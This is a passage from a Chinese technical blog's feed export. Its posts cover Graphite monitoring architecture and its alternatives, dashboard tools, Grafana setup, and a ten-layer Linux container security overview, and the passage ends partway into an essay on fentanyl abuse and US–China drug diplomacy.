    <content type="text"><![CDATA[概要 1.指标采集器 - Dropwizard Metrics, StatsD 2.监听器 - Carbon, graphite-ng, Riemann 3.存储数据库 – Whisper, InfluxDB, Cyanite Josh Dreyfuss: Graphite vs. Grafana: Build the Best Monitoring Architecture for Your Application Graphite 是处理可视化和指标数据的优秀开源工具。它有强大的查询 API 和相当丰富的插件功能设置。事实上，Graphite 指标协议（metrics protocol）是许多指标收集工具的事实标准格式。然而，Graphite 并不总是一个可以简单部署和使用的工具。由于设计方面的原因，加上它使用过程中涉及大量的小 I/O 操作，在规模化应用中会遇到一些问题，而且部署起来可能有点麻烦。 Graphite 部署痛苦的部分原因是，它是由三个不同的元素组成（当然，如果包括指标采集就是四个），这些取决于你的环境，只有其中一个或多个默认元素可能不能满足你的需要。￼ 虽然 Graphite 包含三个组件可能会导致一些实施的问题，但也有积极的成果。每一个模块块都是一个独立的单元，这样你就可以按照实际的需要混合和匹配使用三个组件中的哪一个。同时意味着您可以为自己构建一个完全定制化的 Graphite 部署方案。 让我们逐一来看看你需要做些什么，对于 Graphite 的每一个组成部分来说，都可以是一个 Graphite 的方案或者是非 Graphite 的替代品。 1. 指标采集器 - Dropwizard Metrics, StatsDGraphite 部署方案中的的第一个步骤根本不是 Graphite 的组成部分。这是因为 Graphite 自身并不支持采集任何指标；Graphite 需要有人将指标数据发送给它。这通常不是一个特别大的限制，因为大多数指标采集器都支持以 Graphite 格式提供指标数据，但仍然有一些东西需要注意。我们可选的不同指标采集器可以列一个庞大的列表，但是没有一个工具是包含在基础 Graphite 中的。 选择你的指标采集器 – Graphite 文档中提供了一个工具列表，包括流行的选择像 CollectD 和 Diamond ，但它很少更新，所以你还可以考虑以下两个方案： Dropwizard Metrics – Metrics 是一个 Java 库，通过一系列指标为你提供生产环境的可视化。它有一个 Graphite Reporter，可以将所有的指标数据发送到 Graphite 实例。对于需要在 Java 生态中使用 Graphite 的场景来说，它是一个不错的选择。 StatsD – StatsD 是一个基于 Node.js 运行的网络守护进程，来自 Etsy (网络电商平台)。它可以监听一系列统计、指标数据，并将它们聚集到像 Graphite 这样的工具中。StatsD 也可以和很多其他的可视化、指标采集工具一起工作。 小结： Graphite 不和特定的指标采集器捆绑。然而， Graphite 指标协议是非常常见的，因此不难找到一个或多个与您的应用程序一起工作的协议。既然有这么多的指标采集器和 Graphite 配合良好，你不需要只选择一个，你可以选择从多个数据源发送指标。 2. 监听器 - Carbon, graphite-ng, and RiemannGraphite 的另一部分是用于监听发送的指标数据并将其写入磁盘的组件 —— Carbon （原意：碳）。Carbon 是由守护进程组成的，在工作方式方面有一些内置的灵活性。 在基本的小规模部署中， Carbon 守护程序会监听指标数据并将它们报告给 Whisper 存储数据库。然而，随着规模的增长可以添加一个聚合元素（A ggregation），它在一段时间内缓冲指标数据，然后将它们发送给一个大块中的 Whisper 。你也可以使用 Carbon 传递指标副本到多个 Carbon 后台。当你达到更高的规模、需要多个 Carbon 后台程序来处理传入的指标数据时，这一点特别有用。 缺点和潜在的问题 —— 人们通常遇到的问题通常跟规模相关。就规模应用而言，Carbon 有以下几个缺点 ： 一个单独的 Carbon 守护程序处理能力有限，因为它是用 Python 语言设计的。本机代码不支持一次多个线程同时运行（ Multiple threads），所以可能出现 Carbon 守护程序刚刚启动时丢弃指标数据的情况。 Carbon 有一个它一次能处理负载数量的阈值，但这个阈值并没有传达给你。 Carbon 并没有持续打开 Whisper 的文件句柄，所以存储每个指标都需要多步的完整读/写序列。 基于标准的 Graphite 部署实例中，这些情况的解决方法是将工作划分为中继器（ Carbon relays） 和 缓存（Carbon caches ）。尽管如此，您仍然需要注意负载，因为超过了 Carbon 的负荷会导致数据丢失。如果这个后果对你来说无法接受，可以看看 Carbon 的替代解决方案。 Carbon 替代方案Carbon 的另一种替代方法是 graphite-ng，本质上是基于 Go 语言重写了一遍 Carbon ，以解决上面提到的几个问题。迄今为止，该项目的重点是改进 Carbon 的中继和聚合功能。如果你喜欢 Carbon 的功能，但是又想要绕过一些性能方面的限制，这是一个不错的选择。 另一个替代方案是 Reimann。基于 Clojure 语言实现（属于 LISP 编程语言家族），Reimann 是用来聚集和处理“事件流（event streams）”。事件和流都是相当简单的概念，Riemann 能代替 Carbon 把它们发送到 Graphite 实例。它在这个过程增加了一些提供了额外的好处，例如告警功能。如果你想设计一个远离 Carbon 的架构，这是一个很好的选择，还能加入一些涉及告警方面的能力。 争议观点 Cyanite does not only “work with carbon”. Just like influxdb, it implements the graphite line receiver protocol and thus replaces carbon-cache. Riemann can’t send data to your graphite deployment “in place of carbon”. It can act as a much more powerful carbon-aggregator, but it doesn’t replace carbon-cache. 小结： Carbon 负责监听指标数据并将它们写入到您的存储数据库，但经常在规模化应用上遇到性能问题。有一些现成的替代方案可以解决这个问题。 3. 存储数据库 – Whisper, InfluxDB, Cyanite您需要选择的下一个组件是存储数据库。在 Graphite 体系结构中称之为 Whisper。Whisper 是一种固定大小的数据库，用于存储时间序列数据，在保存和取样方面提供了相当的精确度。在标准的 Graphite 部署中，Carbon 将指标值写入 Whisper 存储，用于在 Graphite-web 组件中实现可视化。 缺点和潜在问题：Whisper 基于 RRD（Round- Robin Database），但写入操作的时候有一些关键性的差异，例如回填项目历史数据和处理不规则数据的能力。这里有一些指标和可视化工具的有用特性，但它们的实现都是基于某种折衷。 因为 Whisper 是用Python编写的，所以相对来说性能较慢； 按照 Whisper 的设计，它会遇到一些存储空间的问题，因为每个指标都需要一个文件，并且都是单个实例。这是一种有意的权衡，以实现前面提到的一些好处，但不可否认，Whisper 对磁盘空间的利用效率较低。 由于 Carbon 和 Whisper 在设计方面的原因，它们最终都涉及到大量的 IO 请求。当你超越小型部署时，磁盘 IO 的伸缩能力会成为摆在面前的一个问题。 Whisper 替代方案你可以通过部署固态硬盘（SSD）或者其它一些设计解决 Whisper 的性能问题，但也只是点到为止。如果数据库部分正是你所需要的，那么有几个选择可以考虑。 目前主要的一个选择是 influxdata（InfluxDB）。influxdata 是一个基于 LevelDB、用 Go 语言编写的时间序列数据库。influxdata 能够解决一些磁盘 IO 写优化问题，同时不要求 one metric = one file 。 influxdata 支持 Carbon 使用的协议，使它能够悄悄置换 Whisper，实现类似 SQL的查询语言。甚至已经有一些项目设计用来使 influxdata 的置换更简便易行，例如 graphite-influxdb 项目 ，使得可以和 Graphite 的 API 无缝衔接。influxdata 属于非常有前途的新兴项目，可以在广泛的范围内与其他工具一起工作。 另一个选择是使用基于 Cassandra 的存储数据库。得益于 graphite-cyanite 项目的工作，基于 Cyanite 数据库可以很容易实现这一目的。 Cyanite 的开发规划目标就是在 Graphite 体系结构中替换 Whisper ，这意味着它可以和 Carbon 、 Graphite-web 一起工作（需要少量的一些依赖）。使用 Cyanite 有助于解决 Whisper 在大规模部署场景中存在的性能和高可用问题。 小结 ： Graphite 体系结构中，数据存储组件是 Whisper 。在大规模应用中，除非你在硬件方面大量投入、把它分解成复杂的手动集群模式，否则将悄悄地会遇到一些性能和可用性问题。如果你需要关注这些问题，可以使用数据库的替代选项来提高性能和可用性。 4. 可视化组件 – Graphite-Web 和 Grafana一旦你收集并存储了指标数据，就下来的步骤就是可视化它们。Graphite-web 的角色就是提供可视化。 Graphite-web 是一种基于 Django 的 Web 应用程序，提供指标数据可视化和交互能力。它在数据的处理方面提供了相当多的能力，但可视化组件并不十分美观（也就是说 “土”、“丑”）。Graphite-web 作为前端组件，我们将着重讨论用户体验的相关内容。￼ Graphite-web 替代方案归功于卓越的 Graphite API ，目前有一系列第三方仪表盘工具可以支持 Graphite 。因为有如此众多的可视化选项，它们的优劣其实主要取决于个人品味，再次不作过多扩展，但我确实想特别指出其中的一个。也许最具潜力的 Graphite 可视化替代方案， 或至少是人们谈论最多的是 Grafana 。 Grafana 是一个开源的仪表盘工具，可以兼容 Graphite 和 InfluxDB 。Grafana 曾经只是一个基于 Elasticsearch 存储的前端仪表盘工具，从 V2.0 版本开始，它拥有了一个支持用户自定义的后端存储组件。Grafana 在设计之初即考虑到支持 Graphite 创建更加优美的可视化组件，因此它非常适合替换默认的 Graphite-web 。Grafana 功能相当丰富，性能稳定。Grafana 拥有一个后端组件，如果你也可以找到纯粹的前端工具，Graphite 文档中提供了工具列表。 小结： 如果你觉得 Graphite 提供的默认可视化效果过于基础和乏味，有大量的可视化替代方案可以选择。其中一些是纯粹客户端，有的包含一个存储你建立的仪表盘后端组件。不管你要什么，你都能在这里找到东西。 5. 代码级指标 – TrendsOverOps 发布了一个新的功能，可以让你把代码级指标从 JVM 应用程序中的错误、与变量状态在一起发送到 Graphite 。详细：https://www.overops.com 123456789101112&#123; backends: [ "./backends/graphite" ] // identify this backend as Graphite graphitePort: 2003, // port of Graphite server graphiteHost: "graphite.example.com", // hostname or IP of Graphite server deleteCounters: true, graphite: &#123; // Graphite tweaks for Takipi prefixCounter: "", prefixGauge: "", globalPrefix: "", legacyNamespace: false &#125;&#125; 总结所有针对 Graphite 的投诉都集中于（它的工作性能不够稳定，仪表盘丑陋！规模化部署是硬伤！），但不妨碍它成为一个很流行的工具。如果你想要一个开源的指标和可视化工具，为许多企业级工具提供支持，那么 Graphite 值得一试。其中最重要的一点是，你可以自定义数据内容。Graphite 并不是由完全特定的组件一起工作，其中的乐趣何在 ？经过一些尝试和错误，您可以在您自己的环境中构建一个完全定制化的、非常有用 Graphite （或类似 Graphite 的）部署方案。 扩展阅读：数据可视化 数据可视化（一）思维利器 OmniGraffle 绘图指南 数据可视化（二）跑步应用Nike+ Running 和 Garmin Mobile 评测 数据可视化（三）基于 Graphviz 实现程序化绘图 数据可视化（四）开源地理信息技术简史（Geographic Information System 数据可视化（五）基于网络爬虫制作可视化图表 数据可视化（六）常见的数据可视化仪表盘(DashBoard) 数据可视化（七）Graphite 体系结构详解 参考文献 实时数据可视化 Graphite vs. Grafana: Build the Best Monitoring Architecture for Your Application influxdata.com: Storage Engine Graphite的百万Metrics实践之路]]></content>
      <tags>
        <tag>数据可视化</tag>
        <tag>架构师</tag>
        <tag>Developer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[History_Psychology]]></title>
    <url>%2F2017%2F11%2F27%2FHistory-Psychology%2F</url>
    <content type="text"><![CDATA[摘要扩展阅读Why Your Brain Hates Other People | BY ROBERT SAPOLSKY ILLUSTRATION BY IGNACIO SERRANO DECEMBER 14, 2017 Why Your Brain Hates Other People And how to make it think differently. The core of Us/Them-ing is emotional and automatic. 参考文献]]></content>
  </entry>
  <entry>
    <title><![CDATA[数据可视化（六）常见的可视化仪表盘(DashBoard)]]></title>
    <url>%2F2017%2F11%2F23%2FVisualization-DashBoard%2F</url>
    <content type="text"><![CDATA[摘要 仪表盘（DashBoard） 决策路径 (Decision Path) ELK Stack（Elasticsearch、Logtash、Kibana） Graphite &amp; Grafana Keen IO 、Librato、DataDog 仪表盘（DashBoard） 指标工具 (Metrics Tools) 可视化工具 (Visualization Tools) 日志管理工具 (Log Management tools) 决策路径 (Decision Path) OpenSource or SaaS ? 开源软件：需要自己安装和配置 ( Graphite and ELK stack ) SaaS：需要改造现有程序、嵌入代码 ( Keen IO, Librato, and DataDog) Analytics or Visualization复杂分析: Keen IO 、 ELK stack监控/指标呈现：Graphite（Grafana）、 DataDog Budget and Environment 迁移成本：例如现有资产中已经有 Graphite 数据，采用Grafana可即时提升数据可视化效果 成本预算：例如日志分析器（log analyzer）的带宽和存储 Options ELK Stack （Elasticsearch、Logtash、Kibana） Graphite &amp; Grafana : 基于数据分析的网络态势感知 Keen IO Librato DataDog 选项 价格 优点 弱点 ELK Stack 免费（Elastic paid plans 提供不同级别的专家服务） Strong Communities;Kibana 包含商业分析；ES 与 Kibana 易集成 安装配置；大规模使用时的机器成本 Graphite 免费 real-time graphs of numeric and time-differentiated data 数据采集和复杂分析能力弱； Grafana 免费 支持多种数据源，提供丰富的插件 不提供数据存储，不提供数据采集 Keen IO Free to $2000/月，按量收费 实时/归档数据可视化能力强；易于共享和提取数据 需要嵌入代码，依赖和拓展管理难度 Librato 按指标收费 监测和管理云应用，提供可以高度定制化的报表及告警功能 计费复杂，不提供数据采集，需要嵌入代码，依赖和拓展管理难度 DataDog 免费版，标准版（主机数量，$15台/月） app、软硬件数据统一 目前不发展数据分析 ELK StackElasticsearch: 搜索和分析能力Logstash: 日志聚合器(Aggregator)Kibana：DashBoard Graphite &amp; Grafana Graphite: 开发语言（Python），支持数据存储、图形化和可视化，本身并不收集数据，需要和采集工具配合。 Grafana: 开发语言（Go），提供了一个指标集的仪表盘，可以将 Graphite 作为数据源（DataSource）。 Grafana provides many additional features and spiffy looking visuals to Graphite Keen IOKeen IO is a SaaS analytics infrastructure platform. Librato监测和管理云应用；提供可以高度定制化的报表；提供多样化的告警通知方式：邮件、HipChat、Campfire、HTTP Post DataDogDataDog is SaaS monitoring tool.DataDog 主要围绕数据聚集和呈现，并不关注数据分析，即强调所有硬件、软件产生的数据实现汇聚统一。 扩展阅读：数据可视化 数据可视化（一）思维利器 OmniGraffle 绘图指南 数据可视化（二）跑步应用Nike+ Running 和 Garmin Mobile 评测 数据可视化（三）基于 Graphviz 实现程序化绘图 数据可视化（四）开源地理信息技术简史（Geographic Information System 数据可视化（五）基于网络爬虫制作可视化图表 数据可视化（六）常见的数据可视化仪表盘(DashBoard) 数据可视化（七）Graphite 体系结构详解 参考文献]]></content>
      <tags>
        <tag>数据可视化</tag>
        <tag>架构师</tag>
        <tag>Developer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Grafana]]></title>
    <url>%2F2017%2F11%2F22%2FVisualization-Grafana%2F</url>
    <content type="text"><![CDATA[摘要待编辑 ABC12brew install grafanabrew services start grafana 1cd $GOPATH/src/github.com/appliedgo/diydashboard 扩展阅读：数据可视化 数据可视化（一）思维利器 OmniGraffle 绘图指南 数据可视化（二）跑步应用Nike+ Running 和 Garmin Mobile 评测 数据可视化（三）基于 Graphviz 实现程序化绘图 数据可视化（四）开源地理信息技术简史（Geographic Information System 数据可视化（五）基于网络爬虫制作可视化图表 数据可视化（六）常见的数据可视化仪表盘(DashBoard) 数据可视化（七）Graphite 体系结构详解 参考文献 使用 promethues 和 grafana 监控自己的 linux 机器 How to Install Grafana on Linux Servers A DIY Dashboard with Grafana Graphite vs. Grafana: Build the Best Monitoring Architecture for Your Application Better application deployment. Monitoring your application with Graphite/Grafana Ganglia Graphite | 2015 Eight years of Go]]></content>
      <tags>
        <tag>数据可视化</tag>
        <tag>架构师</tag>
        <tag>Developer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[QuickStart]]></title>
    <url>%2F2017%2F11%2F16%2FQuickStart%2F</url>
    <content type="text"><![CDATA[QuickStart RiboseYim’s Blog Root Catalog 2018 年度盘点 Mybridge:Read great articles relevant for your work Study The Master Commands: Linux、Mac、Windows 数据可视化（十）公共数据源列表 我的电子书列表 《The Linux Perf Master| 操作系统性能专家》 《The Cyber-Security Master | 网络安全专家》 《The Data Visualization Master | 数据可视化专家》 《The Machine Learning Master | 机器学习专家》 知识分享圈子 知识星球|睿哥读书会（年费制） 知识星球|系统运维专家（免费加入） 知识星球|Machine Learning 小组（免费加入） 知识星球|经济学人翻译社（免费加入）]]></content>
  </entry>
  <entry>
    <title><![CDATA[DevOps-Container-Kubernetes]]></title>
    <url>%2F2017%2F11%2F15%2FDevOps-Container-Kubernetes%2F</url>
    <content type="text"><![CDATA[摘要 扩展阅读：DevOps 漫谈系列 《凤凰项目》：从作坊到工厂的寓言故事 Kanban 看板管理实践 DevOps 漫谈：基础设施部署和配置管理 Linux 容器安全的十重境界 工程师的自我修养：全英文技术学习实践 DevOps 实践的本质是文化 学习力－团队生命之根 带领团队翻译书籍 Don’t make me think 凡是被很多人不断重复的好习惯，要将其自动化整合到工具 参考文献 OpenShift 图解 Five tips to move your project to Kubernetes Write a Kubernetes-ready service from zero step-by-step | Go-lang kubernetes在腾讯游戏的应用实践|2017-03-06 黄惠波 云技术实践]]></content>
      <tags>
        <tag>DevOps</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Cyber-Security:Linux容器安全的十重境界]]></title>
    <url>%2F2017%2F11%2F12%2FDevOps-Container-Security%2F</url>
    <content type="text"><![CDATA[摘要容器安全解决方案需要考虑不同技术栈和容器生命周期的不同阶段。 This article is part of an Virtualization Technology tutorial series. Make sure to check out my other articles as well: 2018 年度 Docker 用户报告 - Sysdig Edition Cyber-Security: Linux 容器安全的十重境界 DevOps漫谈：Docker ABC 提纲 1.容器操作系统与多租户 2.容器内容（使用可信源） 3.容器注册 (容器镜像加密访问) 4.构建过程安全 5.控制集群中可部署的内容 6.容器编排：加强容器平台安全 7.网络隔离 8.存储 9.API 管理, 终端安全和单点登录 (SSO) 10.角色和访问控制管理 容器提供了一种简单的应用程序打包方法将它们无缝地从开发、测试环境部署到生产环境。它有助于确保各种环境中的一致性，包括物理服务器、虚拟机（VM）或私有或公共云。领先的组织基于这些好处迅速采用容器，以便轻松地开发和管理增加业务价值的应用程序。 企业应用需要强壮的安全性，任何在容器中运行基础服务的人都会问：“容器是安全的吗？”、“可以让我们的应用程序信任容器吗？” 保护容器非常类似于确保任何正在运行的进程。在部署和运行容器之前，您需要考虑整个解决方案技术栈的安全性。您还需要考虑在应用程序和容器的完整生命周期的安全性。 请尝试在这 10 个方面加强容器的不同层次、不同技术栈和不同生命周期阶段的安全性。 1. 容器操作系统与多租户对于开发人员来说，容器使得他们更容易地构建和升级应用程序，它可以作为一个应用单元的被依赖，通过在共享主机上部署启用多租户应用程序来最大限度地利用服务器资源。容器很容易在单个主机上部署多应用程序，并根据需要开启和关闭单个容器。为了充分利用这种打包和部署技术，运维团队需要正确的运行容器环境。运维人员需要一个操作系统，该系统可以在边界处保护容器，使主机内核与容器隔离并确保容器彼此之间安全。 容器是隔离和约束资源的 Linux 进程，使您能够在共享宿主内核中运行沙盒应用程序。您保护容器的方法应该与确保 Linux 上任何正在运行的进程的安全方法相同。放弃特权是重要的，目前仍然是最佳实践。更好的方法是创建尽可能少的特权容器。容器应该作为普通用户运行，而不是 root 用户。接下来，利用 Linux 中可用的多种级别的安全特性确保容器的安全： Linux 命名空间，安全增强的Linux（SELinux）， cgroups，capabilities 和安全计算模式（seccomp）。 2. 容器内容（使用可信源）当说到安全性的时候，对于容器内容来说意味着什么呢？。一段时间以来，应用程序和基础设施都是由现成的组件组成的。很多都来自于开源软件，例如如 Linux 操作系统，Apache Web 服务器，红帽 JBoss 企业应用平台，PostgreSQL 和 Node.js。基于容器的各种软件包版本现在一应俱全，所以你不需要建立自己。但是，与从外部源下载的任何代码一样，您需要知道包的起源、它们是由谁创建，以及它们内部是否存在恶意代码。 3. 容器注册 (容器镜像加密访问)你的团队构建容器的时候基于下载的公共容器镜像，所以对它的访问管理和更新下载是管理的关键，需以同样的方式管理容器镜像、内建的镜像及其他类型的二进制文件。许多私有仓库注册服务器支持存储容器镜像。选择一个私有的、存储使用的容器镜像自动化策略的注册服务器。 4. 构建过程安全在一个容器化的环境里，软件的构建是整个生命周期的一个阶段，应用程序代码需要与运行库集成。管理此构建过程是确保软件栈安全的关键。坚持“一次构建，到处部署（build once, deploy everywhere）”的理念，确保构建过程的产品正是生产中部署的产品。这一点对于维护容器持续稳定也非常重要，换句话说，不要为运行的容器打补丁；而是应该重新构建、重新部署它们。无论您是在高度规范的行业中工作，还是仅仅想优化团队的工作，需要设计容器镜像的管理和构建过程，以利用容器层实现控制分离，从而使： 运维团队管理基础镜像 架构团队管理中间件、运行时、数据库和其它解决方案 开发团队仅仅专注于应用层和代码 最后，对定制的容器签名，这样可以确保它们在构建和部署环节之间不会被篡改。 5. 控制集群中可部署的内容为了防备在构建过程中发生任何问题，或者在部署一个镜像后发现漏洞，需要增加以自动化的、基于策略的部署的另一层安全性。 让我们看一下构建应用程序的三个容器镜像层：核心层（core）、中间件层（middleware）和应用层（application）。一个问题如果在核心镜像被发现，镜像会重新构建。一旦构建完成，镜像将被推入容器平台注册服务器。平台可以检测到镜像发生了变化。对于依赖于此镜像并有定义触发器的构建，该平台将自动重建应用程序并整合已经修复的库。 一旦构建完成，镜像将被推入容器平台的内部注册服务器。内部注册服务器中镜像的变化能立即检测到，通过应用程序中定义的触发器自动部署更新镜像，确保生产中运行的代码总是与最近更新的镜像相同。所有这些功能协同工作，将安全功能集成到您的持续集成和持续部署（CI / CD）过程中。 6. 容器编排：加强容器平台安全当然，应用程序很少在单个容器中交付。即使是简单的应用程序通常有一个前端，后端和数据库。在容器中部署现代微服务应用，通常意味着多容器部署，有时在同一主机上有时分布在多个主机或节点，如图所示。 当规模化管理容器部署时，您需要考虑： 哪些容器应该部署到哪个主机上？ 哪个主机容量更大？ 哪些容器需要相互访问？他们将如何相互发现？ 如何控制对共享资源的访问和管理，比如网络和存储？ 如何监控容器健康状态？ 如何自动扩展应用能力以满足需求？ 如何使开发者在自助服务的同时满足安全需求？ 考虑到开发人员和运维人员拥有的广泛能力，强大的基于角色的访问控制是容器平台的关键元素。例如，编排管理服务器是访问的中心点，应该得到最高级别的安全检查。API 是大规模自动化容器管理的关键，用于验证和配置容器、服务和复制控制器的数据；对传入的请求执行项目验证；并调用其他主要系统组件上的触发器。 7. 网络隔离在容器部署现代微服务应用程序往往意味着在多个节点分布式部署多个容器。考虑到网络防御，您需要一种在集群中隔离应用程序的方法。 一个典型的公共云服务，例如Google Container Engine (GKE),Azure Container Services, 或者 Amazon Web Services (AWS) Container Service，都是单租户服务。它们允许在您启动的 VM 集群上运行容器。为了实现多租户容器安全，您需要一个容器平台，允许您选择单个集群并将流量分段，以隔离该集群中的不同用户、团队、应用程序和环境。 通过网络命名空间，每个容器集合（称为“POD”）获得自己的IP和端口绑定范围，从而在节点上隔离 POD 网络。 默认情况下，来自不同命名空间（项目）的 POD 不能将包发送到或接收来自不同项目的 POD 、服务的数据包，除了下文所述的选项。您可以使用这些特性来隔离集群中的开发人员、测试和生产环境；然而，IP 地址和端口的这种扩展使得网络变得更加复杂。可以投资一些工具处理这种复杂性。首选的工具是采用软件定义网络（SDN）容器平台，它提供统一的集群网络，保证整个集群的容器之间的通信。 8. 存储对于有状态和无状态的应用程序来说，容器是非常有用的。保护存储是保证有状态服务的关键要素。容器平台应提供多样化的存储插件，包括网络文件系统（NFS），AWS Elastic Block Stores（EBS，弹性块存储），GCE Persistent 磁盘，GlusterFS，iSCSI，RADOS（CEPH）、Cinder 等等。 一个持久卷（PV）可以安装在由资源提供者支持的任何主机。供应商将有不同的能力，每个 PV 的访问模式可以设置为特定卷支持的特定模式。例如，NFS 可以支持多个 读/写的客户端，但一个特定的 NFS PV 可以在服务器上仅作为只读输出。每个 PV 有它自己的一套访问模式，定义特定 PV 的性能指标，例如ReadWriteOnce, ReadOnlyMany, 和 ReadWriteMany。 9. API 管理, 终端安全和单点登录 (SSO)保护应用程序安全包括管理应用程序和 API 身份验证和授权。Web SSO 功能是现代应用程序的关键部分。当开发者构建他们自己的应用时，容器平台可以提供各种容器服务给他们使用。 API 是微服务应用的关键组成部分。微服务应用具有多个独立的 API 服务，这导致服务端点的扩张，因此需要更多的治理工具。推荐使用 API 管理工具。所有 API 平台都应该提供各种 API 认证和安全的标准选项，它们可以单独使用或组合使用，发布证书和控制访问。这些选项包括标准的 API 密钥、应用ID、密钥对和 OAuth 2.0。 10. 角色和访问控制管理（Cluster Federation）2016年7月，Kubernetes 1.3 介绍了 Kubernetes Federated Cluster。这是一个令人兴奋的新功能，目前在 Kubernetes 1.6 beta 。 在公共云或企业数据中心场景中，Federation 对于跨集群部署和访问应用服务是很有用的。多集群使得应用程序的高可用性成为可能，例如多个区域、多个云提供商（如AWS、Google Cloud 和 Azure）实现部署或迁移的通用管理。 在管理集群联邦时，必须确保编排工具在不同的部署平台实例中提供所需的安全性。与以往一样，身份验证和授权是安全的关键 —— 能够安全地将数据传递给应用程序，无论它们在何处运行，在集群中管理应用程序多租户。 Kubernetes 扩展了集群联邦包括支持联邦加密，联邦命名空间和对象入口。 参考文献 10 layers of Linux container security | Daniel Oh | Senior Specialist Solution Architect at Red Hat 扩展阅读: 网络安全专题合辑《Cyber-Security Manual》 Cyber-Security: Linux 容器安全的十重境界 Cyber-Security: 警惕 Wi-Fi 漏洞，争取安全上网 Cyber-Security: Web应用安全：攻击、防护和检测 Cyber-Security: IPv6 &amp; Security Cyber-Security: OpenSSH 并不安全 Cyber-Security: Linux/XOR.DDoS 木马样本分析 浅谈基于数据分析的网络态势感知 Packet Capturing:关于网络数据包的捕获、过滤和分析 新一代Ntopng网络流量监控—可视化和架构分析 Cyber-Security: 事与愿违的后门程序 | Economist Cyber-Security: 美国网络安全立法策略 Cyber-Security: 香港警务处拟增设网络安全与科技罪案总警司 扩展阅读：DevOps 漫谈系列 《凤凰项目》：从作坊到工厂的寓言故事 Kanban 看板管理实践 DevOps 漫谈：基础设施部署和配置管理 Linux 容器安全的十重境界 工程师的自我修养：全英文技术学习实践 DevOps 实践的本质是文化 学习力－团队生命之根 带领团队翻译书籍 Don’t make me think 凡是被很多人不断重复的好习惯，要将其自动化整合到工具]]></content>
      <tags>
        <tag>DevOps</tag>
        <tag>Cyber-Security</tag>
        <tag>网络协议</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[嗑药简史：扰动大国外交的China Girl(芬太尼)]]></title>
    <url>%2F2017%2F11%2F06%2FAddiction-Decision-Fentanyl%2F</url>
    <content type="text"><![CDATA[摘要 一、什么是芬太尼（Fentanyl）：从天使到魔鬼 二、大国外交的头等优先事项 三、预测：暗黑幽灵无国界 2017年10月26日，美国总统特朗普宣布，因芬太尼药物上瘾和滥用危机严重，美国正式进入全国公共卫生紧急状态。特朗普当天在白宫说，芬太尼滥用正肆虐美国，是本国历史乃至全世界范围内最严重的药物危机，这不仅是“国家的耻辱”，也是“人类的悲剧”，联邦政府正全面遏制阿片类药物的滥用。特朗普称将在与习主席会晤时作为头等优先事项提及芬太尼问题。 芬太尼是何方神圣？区区一种药物也值得成为世界上两个核大国元首会谈的头等优先事项？ 注：高纯度芬太尼可以透过口腔黏膜和皮肤吸收，为防止上瘾和急性中毒，执法人员必须配置防化装备才能接触。 一、什么是芬太尼（Fentanyl）芬太尼（Fentanyl）是一种强效止痛剂，主要用于医疗用途，在处理战伤、手术过程中缓解病患疼痛。 芬太尼的作用机理非常类似于吗啡 —— 读过嗑药简史：关于瘾品，成瘾机制及其历史的同学都知道，所谓吗啡就是鸦片的核心有效成分。所以简单理解，芬太尼就是鸦片 —— 加强版的特效鸦片。 芬太尼最先在 1960 年由保罗·扬森制造。1960 年代以 @Sublimaze 等商业品牌作为全身麻醉剂进入医疗用途。芬太尼药物的形式包括贴片、棒棒糖、溶解片剂和可以被口腔黏膜吸收掉的舌下喷剂等。截至2013年，全球共使用了1700公斤，是医学中使用最广泛的合成鸦片类药物。 从天使到魔鬼一个发明已经半个多世纪，并且在医疗领域广泛应用的药物为什么突然变成魔鬼呢？芬太尼的灾难在于被当作娱乐用药滥用。 普通瘾品一经特殊方法处理，使其效力大增以后，就难免导致更严重的滥用现象，这也是瘾品发展史上一再出现的重要问题。 芬太尼起效迅速而作用时间极短（脑中μ-鸦片受体），比吗啡效力高 50 至 100 倍，在实验室中甚至可以达到 10，000 倍。另外根据美国缉毒署的资料，检获毒品的案例中，大部分上瘾者是混合使用，例如可卡因、海洛因、大麻等传统毒品，只需要混合微量的芬太尼制品即可极大地提升药效。而且芬太尼这种处方药的戒断反应比海洛因还强，上瘾者相对来说更难把握剂量，这也是芬太尼导致大批过量死亡案例的原因。根据美国疾病控制中心的估计 2016 年有 2 万人死于芬太尼。 目前为止，死于芬太尼的最知名的人物应该是音乐天才与艺术家普林斯·罗杰·尼尔森（Prince Rogers Nelson），艺名王子（Prince）。2016年4月15日，Prince 在他的私人飞机上突感不适，紧急降落于伊利诺伊州治疗。2016年4月21日他位于明尼苏达州的 Paisley Park 被发现死亡。后经法医调查，相信死因是服用过量的芬太尼。 二、大国外交的头等优先事项2017年10月17日，美国司法部正式起诉两名中国公民 —— 颜小冰(Xiaobing Yan音译) 和 张剑(Jian Zhang 音译)，指控他们策划通过邮件或国际邮递服务在美国销售大批量的芬太尼等鸦片类药物。该案成为中美两国政府激烈交锋的外交事件。 其实，在关于芬太尼物质列入管制的问题上，中美已经达成共识。中国官方文件将芬太尼定性为“新型精神活性物质”。2017年2月，中国正式将芬太尼——卡芬太尼、呋喃芬太尼、丙烯酰芬太尼、戊酰芬太尼等列入非药用类麻醉药品和精神药品管制品种增补目录。 公安部有关官员表示，中方高度重视新精神活性物质相关工作，积极推动管制立法、建立完善管制机制、大力强化执法打击、务实开展国际合作。2015年10月1日起实施的《非药用类麻醉药品和精神药品列管办法》一次性列管116种新精神活性物质。目前，中国政府列管的新精神活性物质已达134种。其中，列管芬太尼类物质共计23种，涵盖了联合国列管的全部芬太尼类物质。 2017年10月底，中美两国执法机构禁毒合作会议将于在北京举行。中美两国政府关于芬太尼问题的分歧主要如下： 芬太尼的控制责任 在2017年2月份，美国国会美中经济安全审查委员会(U.S.-China Economic and Security Review Commission)的一份报告中援引执法和毒品调查人员的话写道：“中国是美国、墨西哥和加拿大的主要芬太尼供应地”。该报告称，中国当局“对管控这种药物的生产和出口不太重视”。 “The best way to prevent drug addiction and overdose is to prevent people from abusing drugs in the first place. If they don’t start, they won’t have a problem.” – President Donald J. Trump 中国公安部禁毒局的态度是：“依照现在中美双方交流交换的情报信息，证据还不足以说明大部分芬太尼物质或其他新精神活性物质来自中国”。 芬太尼的管制强度 